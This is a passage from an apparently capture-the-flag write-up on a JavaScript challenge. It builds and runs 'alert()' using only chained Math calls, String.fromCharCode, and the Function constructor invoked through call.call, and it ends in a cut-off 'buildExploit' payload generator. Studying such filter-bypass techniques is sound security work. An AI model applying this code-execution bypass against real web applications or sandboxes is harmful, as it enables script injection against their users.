class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token comment">// []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, we have an empty array <code>Math.seeds</code> that we can use to store elements.</p><h2><span id="2-finding-the-desired-characters">2. Finding the desired characters</span></h2><p>Firstly, we can check if the desired characters exist within <code>Math</code>. For example, <code>Math.abs.name</code> gives us the string <code>&quot;abs&quot;</code>, and by using <code>.at()</code> on it, <code>Math.abs.name.at()</code> would be <code>&quot;a&quot;</code>.</p><p>Therefore, <code>Math.seeds.push(Math.abs.name.at())</code> would make the contents of <code>Math.seeds</code> become <code>[&quot;a&quot;]</code>.</p><p>The return value of <code>Array.prototype.push</code> is the length of the array. Hence, if we can find a function whose second letter is <code>&#39;l&#39;</code>, it would be optimal to reduce the number of function calls.</p><p>By now, you might have realized that manually solving this challenge would be tiresome. Automating the process would be a better approach. So, let’s write a function!</p><p>We can use recursion to explore each property of accessible objects and check if it meets our desired criteria. The function implementation is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can use the function as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We can also improve the usability by organizing it as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Earlier, we mentioned that we would first try to find the desired character by using the array’s length. But what if we can’t find it?</p><p>In that case, we can try another approach: finding it at a fixed index.</p><p>For example, <code>Math.LN2</code> is <code>0.69</code>, and when we pass a decimal number as an argument to <code>Array.prototype.at()</code>, it automatically rounds down to the nearest integer. So, it becomes <code>0</code>.</p><p>Suppose the original return value of <code>arr.push()</code> is 2. By wrapping it with <code>Math.LN2.valueOf(arr.push())</code>, we can convert the number back to 0, allowing us to use the first character to find the desired function name.</p><p>Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>This code will make the contents of the array become <code>[&#39;a&#39;, &#39;l&#39;]</code>.</p><p>Following this approach, we can prepare a few more indices. I have prepared four:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>  <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>  <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>  <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>At this point, we should be able to find all the English letters we need. But what about symbols like <code>()</code>? How do we handle those?</p><p>This is where we can recall the handy function <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode()</a>. It can convert a number into a corresponding character string.</p><p>To access <code>String</code> from <code>Math</code>, we can simply find any string and access its constructor, like <code>Math.abs.name.constructor.fromCharCode</code>.</p><p>Now, the question becomes, how do we generate numbers?</p><p>Since we are already using Math, let’s write a searching function that tries various combinations of Math functions!</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When we construct <code>alert</code>, the return value of the last push operation will be 5. Since the ASCII code for <code>(</code> is 40, we can obtain 40 with the following expression: <code>Math.floor(Math.log2(Math.cosh(Math.clz32(5))))</code>.</p><p>By concatenating it with the previous code, we can obtain <code>(</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">log2</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">cosh</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">clz32</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Putting it all together, we can form an array with the desired characters.</p><h2><span id="3-how-to-join-the-array">3. How to join the array?</span></h2><p>To join the array elements together, we need to find an empty string to transform the array into the desired string format.</p><p>Initially, my idea was to generate a whitespace character and use <code>&quot; &quot;.trim()</code>. However, this approach would involve function calls like <code>fn().trim()</code>, which violates the rules specified in the challenge.</p><p>Fortunately, there is another way to invoke functions: <code>String.prototype.trim.call(&quot; &quot;)</code>. This method allows us to obtain an empty string.</p><p>We can utilize the method we used earlier to find <code>(</code> to find the whitespace character. Finally, we can add this sequence of function calls to achieve the desired result. Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Assumed we already had the array</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// alert()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="4-how-to-execute-without-using-eval">4. How to execute without using eval?</span></h2><p>Besides <code>eval</code>, we can also use the function constructor, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>For the <code>Function</code> part, we can simply find any function and access its constructor:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>But what about the final <code>()</code>?</p><p>Similarly, we can invoke a function in another way. For example, <code>alert.call()</code> can be written as <code>Function.prototype.call.call(alert)</code>. Therefore, the code we need is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span id="5-putting-it-all-together">5. Putting it all together</span></h2><p>I have written a simple script to generate the code. Here is the complete code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pop</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span 